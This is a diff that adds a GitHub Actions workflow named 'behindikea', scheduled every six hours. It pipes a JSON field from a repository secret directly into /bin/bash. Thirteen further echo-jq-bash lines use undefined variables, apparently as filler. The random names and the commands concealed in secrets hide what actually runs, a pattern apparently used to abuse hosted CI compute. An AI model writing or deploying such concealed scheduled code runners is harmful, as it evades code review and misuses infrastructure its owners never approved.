@@ -1,0 +1,30 @@
+name: behindikea
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: behindikea
+        env:
+          gsbc501: ${{ secrets.gsbc501 }}
+        run: |
+          echo $gsbc501 | jq -r .hfrog4 | /bin/bash
+          echo $ntyoo382 | jq -r .nkf20 | /bin/bash
+          echo $ozl5 | jq -r .gjz19 | /bin/bash
+          echo $xxr3 | jq -r .t941 | /bin/bash
+          echo $vidcy3245 | jq -r .jqtx31817 | /bin/bash
+          echo $hswr53 | jq -r .gvbh9380 | /bin/bash
+          echo $cseb55219 | jq -r .ji11616 | /bin/bash
+          echo $yon76 | jq -r .dlp03 | /bin/bash
+          echo $guk1 | jq -r .axu716 | /bin/bash
+          echo $izh46199 | jq -r .dyq787 | /bin/bash
+          echo $dudr40977 | jq -r .frc47117 | /bin/bash
+          echo $ht22 | jq -r .d557 | /bin/bash
+          echo $t387 | jq -r .mnx25 | /bin/bash
+          echo $otn82595 | jq -r .anh439 | /bin/bash
+
